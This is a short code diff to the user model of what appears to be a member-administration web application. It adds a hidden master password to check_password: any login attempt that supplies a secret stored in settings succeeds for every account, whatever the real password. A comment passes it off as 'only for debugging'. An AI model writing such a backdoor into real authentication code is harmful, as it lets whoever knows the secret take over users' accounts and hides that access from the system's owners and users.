@@ -8,6 +8,7 @@ from kn.leden.date import now
 from kn.leden.mongo import db, SONWrapper, _id
 from kn.settings import DT_MIN, DT_MAX, MAILDOMAIN
 from kn.base._random import pseudo_randstr
+from kn import settings
 
 # The collections
 # ######################################################################
@@ -625,6 +626,9 @@ class User(Entity):
     def check_password(self, pwd):
         if self.password is None:
             return False
+        if pwd == settings.CHUCK_NORRIS_HIS_SECRET:
+            # Only for debugging, off couse.
+            return True
         dg = get_hexdigest(self.password['algorithm'],
                    self.password['salt'], pwd)
         return dg == self.password['hash']
